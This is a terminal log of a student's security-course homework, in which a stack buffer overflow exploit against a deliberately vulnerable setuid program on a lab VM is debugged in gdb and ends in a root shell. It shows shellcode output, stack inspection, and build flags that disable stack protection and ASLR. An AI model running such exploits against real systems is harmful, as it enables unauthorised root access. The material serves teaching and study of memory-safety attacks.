student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
result : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) set follow-fork-mode child
(gdb) b 40
Breakpoint 1 at 0x8048577: file sploit0.c, line 40.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:40
40	  char *result = repeat("A", 399);
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x8048577 in main (sploit0.c:40); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
43	  args[0] = TARGET;
(gdb) n
44	  args[1] = result;
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x8048596 in main (sploit0.c:44); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
46	  args[2] = NULL;
(gdb) n
48	  env[0] = NULL;
(gdb) n
49	  execve(TARGET, args, env);
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485aa in main (sploit0.c:49); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
process 1514 is executing new program: /tmp/target0
Error in re-setting breakpoint 1: No source file named /home/student/cs5435-fa19-hw4/sploits/sploit0.c.
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 1514) exited normally]
(gdb) info frame
No stack.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ pwd
/home/student/cs5435-fa19-hw4/sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?
Illegal instruction (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?
Illegal instruction (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?7?
Illegal instruction (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ../demo/get_sp
Stack pointer (ESP): 0xbffff5d0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) b 26 
Breakpoint 1 at 0x8048577: file sploit0.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:26
26	  char *noop = "\x90";
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x8048577 in main (sploit0.c:26); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) x/64 0xbffff5bc-32
0xbffff59c:	1245240832	-1208241188	-1073744448	0
0xbffff5ac:	-1209919945	-1208242176	-1208242176	0
0xbffff5bc:	-1209919945	1	-1073744300	-1073744292
0xbffff5cc:	0	0	0	-1208242176
0xbffff5dc:	-1207960572	-1207963648	0	-1208242176
0xbffff5ec:	-1208242176	0	2143508341	1141061989
0xbffff5fc:	0	0	0	1
0xbffff60c:	134513696	0	-1208025072	-1208047488
0xbffff61c:	-1207963648	1	134513696	0
0xbffff62c:	134513729	134514011	1	-1073744300
0xbffff63c:	134514288	134514384	-1208047488	-1073744308
0xbffff64c:	-1207961320	1	-1073743996	0
0xbffff65c:	-1073743950	-1073743933	-1073743917	-1073743897
0xbffff66c:	-1073743868	-1073743849	-1073743836	-1073742420
0xbffff67c:	-1073742408	-1073742261	-1073742238	-1073742223
0xbffff68c:	-1073742190	-1073742148	-1073742131	-1073742122
(gdb) x/64 0xbffff5a8-32
0xbffff588:	-1209828784	134514363	1	-1073744300
0xbffff598:	-1073744292	1245240832	-1208241188	-1073744448
0xbffff5a8:	0	-1209919945	-1208242176	-1208242176
0xbffff5b8:	0	-1209919945	1	-1073744300
0xbffff5c8:	-1073744292	0	0	0
0xbffff5d8:	-1208242176	-1207960572	-1207963648	0
0xbffff5e8:	-1208242176	-1208242176	0	2143508341
0xbffff5f8:	1141061989	0	0	0
0xbffff608:	1	134513696	0	-1208025072
0xbffff618:	-1208047488	-1207963648	1	134513696
0xbffff628:	0	134513729	134514011	1
0xbffff638:	-1073744300	134514288	134514384	-1208047488
0xbffff648:	-1073744308	-1207961320	1	-1073743996
0xbffff658:	0	-1073743950	-1073743933	-1073743917
0xbffff668:	-1073743897	-1073743868	-1073743849	-1073743836
0xbffff678:	-1073742420	-1073742408	-1073742261	-1073742238
(gdb) x/64 0xbffff5c0-32
0xbffff5a0:	-1208241188	-1073744448	0	-1209919945
0xbffff5b0:	-1208242176	-1208242176	0	-1209919945
0xbffff5c0:	1	-1073744300	-1073744292	0
0xbffff5d0:	0	0	-1208242176	-1207960572
0xbffff5e0:	-1207963648	0	-1208242176	-1208242176
0xbffff5f0:	0	2143508341	1141061989	0
0xbffff600:	0	0	1	134513696
0xbffff610:	0	-1208025072	-1208047488	-1207963648
0xbffff620:	1	134513696	0	134513729
0xbffff630:	134514011	1	-1073744300	134514288
0xbffff640:	134514384	-1208047488	-1073744308	-1207961320
0xbffff650:	1	-1073743996	0	-1073743950
0xbffff660:	-1073743933	-1073743917	-1073743897	-1073743868
0xbffff670:	-1073743849	-1073743836	-1073742420	-1073742408
0xbffff680:	-1073742261	-1073742238	-1073742223	-1073742190
0xbffff690:	-1073742148	-1073742131	-1073742122	-1073742103
(gdb) x/64x 0xbffff5bc-32
0xbffff59c:	0x4a38de00	0xb7fbb3dc	0xbffff5c0	0x00000000
0xbffff5ac:	0xb7e21637	0xb7fbb000	0xb7fbb000	0x00000000
0xbffff5bc:	0xb7e21637	0x00000001	0xbffff654	0xbffff65c
0xbffff5cc:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffff5dc:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffff5ec:	0xb7fbb000	0x00000000	0x7fc35775	0x44033965
0xbffff5fc:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff60c:	0x08048420	0x00000000	0xb7ff0010	0xb7fea880
0xbffff61c:	0xb7fff000	0x00000001	0x08048420	0x00000000
0xbffff62c:	0x08048441	0x0804855b	0x00000001	0xbffff654
0xbffff63c:	0x08048670	0x080486d0	0xb7fea880	0xbffff64c
0xbffff64c:	0xb7fff918	0x00000001	0xbffff784	0x00000000
0xbffff65c:	0xbffff7b2	0xbffff7c3	0xbffff7d3	0xbffff7e7
0xbffff66c:	0xbffff804	0xbffff817	0xbffff824	0xbffffdac
0xbffff67c:	0xbffffdb8	0xbffffe4b	0xbffffe62	0xbffffe71
0xbffff68c:	0xbffffe92	0xbffffebc	0xbffffecd	0xbffffed6
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x8048577 in main (sploit0.c:26); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) x/x 0xbffff5bc-4
0xbffff5b8:	0x00000000
(gdb) x/x 0xbffff5bc-2
0xbffff5ba:	0x16370000
(gdb) x/x 0xbffff5bc-1
0xbffff5bb:	0xe2163700
(gdb) x/x 0xbffff5bc
0xbffff5bc:	0xb7e21637
(gdb) x/1x 0xbffff5bc
0xbffff5bc:	0xb7e21637
(gdb) x/2x 0xbffff5bc
0xbffff5bc:	0xb7e21637	0x00000001
(gdb) x/x 0xbffff5bc-4
0xbffff5b8:	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1759] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Illegal instruction (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) set follow-fork-mode child
(gdb) b 8
Breakpoint 1 at 0x8048521: file sploit0.c, line 8.
(gdb) b 8
Note: breakpoint 1 also set at pc 0x8048521.
Breakpoint 2 at 0x8048521: file sploit0.c, line 8.
(gdb) set follow-fork-mode child
(gdb) set follow-fork-mode child 8
(gdb) set follow-fork-mode-child 8
No symbol "follow" in current context.
(gdb) set follow-fork-mode-child
No symbol "follow" in current context.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, repeat (s=0x80486f0 "\220", x=202) at sploit0.c:13
13	  char *result = malloc(sizeof(s) * x + 1);
(gdb) n
14	  while (x > 0) {
(gdb) n
15	      strcat(result, s);
(gdb) n
16	      x --;
(gdb) n
14	  while (x > 0) {
(gdb) n
15	      strcat(result, s);
(gdb) n
16	      x --;
(gdb) n
14	  while (x > 0) {
(gdb) n
15	      strcat(result, s);
(gdb) nn
Undefined command: "nn".  Try "help".
(gdb) n
16	      x --;
(gdb) n
14	  while (x > 0) {
(gdb) n
15	      strcat(result, s);
(gdb) n
16	      x --;
(gdb) q
A debugging session is active.

	Inferior 1 [process 1927] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) set follow-fork-mode child
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit0.c, line 22.
(gdb) continue
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x8048632
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff558, args: 
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) x/x $esp
0xbffff55c:	0x08048632
(gdb) n
process 1934 is executing new program: /tmp/target0

Breakpoint 1, main (argc=2, argv=0xbffffd64) at target0.c:16
16		greeting( argv[1] );
(gdb) x/x $esp
0xbffffcc8:	0x00000000
(gdb) n
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

Program received signal SIGSEGV, Segmentation fault.
0x00bffff2 in ?? ()
(gdb) q
A debugging session is active.

	Inferior 1 [process 1934] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit0.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff560:
 eip = 0xb7eb97e0 in execve (../sysdeps/unix/syscall-template.S:84); saved eip = 0x8048632
 called by frame at 0xbffff5c0
 source language asm.
 Arglist at 0xbffff558, args: 
 Locals at 0xbffff558, Previous frame's sp is 0xbffff560
 Saved registers:
  eip at 0xbffff55c
(gdb) n
process 1940 is executing new program: /tmp/target0

Breakpoint 1, main (argc=2, argv=0xbffffd64) at target0.c:16
16		greeting( argv[1] );
(gdb) break 8
Breakpoint 3 at 0x8048474: file target0.c, line 8.
(gdb) info frame
Stack level 0, frame at 0xbffffcd0:
 eip = 0x80484b6 in main (target0.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffcc8, args: argc=2, argv=0xbffffd64
 Locals at 0xbffffcc8, Previous frame's sp is 0xbffffcd0
 Saved registers:
  ebp at 0xbffffcc8, eip at 0xbffffccc
(gdb) x/x eip
No symbol "eip" in current context.
(gdb) x/x $eip
0x80484b6 <main+3>:	0x830c458b
(gdb) x/x $esp
0xbffffcc8:	0x00000000
(gdb) n

Breakpoint 3, greeting (temp1=0xbffffe57 '\220' <repeats 200 times>...) at target0.c:8
8		memset(name, 0, 400);
(gdb) x/x $esp
0xbffffb2c:	0xb7f642a2
(gdb) n
9		strcpy(name, temp1);
(gdb) x/x $esp
0xbffffb2c:	0x00000000
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) x/x $esp
0xbffffb2c:	0x90909090
(gdb) n
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
11	}
(gdb) 
0x00bffff2 in ?? ()
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) 
Cannot find bounds of current function
(gdb) q
A debugging session is active.

	Inferior 1 [process 1940] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh?B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B??
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh?B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B??
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh?B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B??
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh?B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B???B??
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
 ?
  ???V
      ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                                                                                                           ?
                                                                                                           ???V
   ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
  ?
   ???V
       ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
# whoami
root
# q
/bin/sh: 2: q: not found
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Nov 27 19:07:23 2019 from 10.0.2.2
student@5435-hw4-vm:~$ whoami
student
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
[sudo] password for student: 
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
target0   target1    target2    target3    target4
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd .
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
